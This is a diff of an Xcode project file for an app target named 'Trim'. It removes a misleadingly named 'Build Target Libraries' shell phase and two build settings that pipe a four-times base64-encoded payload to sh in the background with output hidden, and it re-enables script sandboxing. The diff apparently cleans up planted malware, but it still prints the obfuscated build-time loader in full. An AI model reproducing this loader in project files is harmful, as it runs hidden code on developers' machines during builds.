@@ -454,7 +454,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FA4BF8592F9FE808007B8755 /* Build configuration list for PBXNativeTarget "Trim" */;
 			buildPhases = (
-				A681C9B02F0842FEB842DAD8 /* Build Target Libraries */,
 				FA4BF8342F9FE802007B8755 /* Sources */,
 				FA4BF8352F9FE802007B8755 /* Frameworks */,
 				FA4BF8362F9FE802007B8755 /* Resources */,
@@ -596,28 +595,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		A681C9B02F0842FEB842DAD8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		FA4BF8342F9FE802007B8755 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -704,7 +681,6 @@
 		FA4BF8572F9FE808007B8755 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhOVjNoTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -739,7 +715,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -768,7 +744,6 @@
 		FA4BF8582F9FE808007B8755 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLWVdFemFEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhOVjNoTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | b | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -803,7 +778,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				ENABLE_USER_SCRIPT_SANDBOXING = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
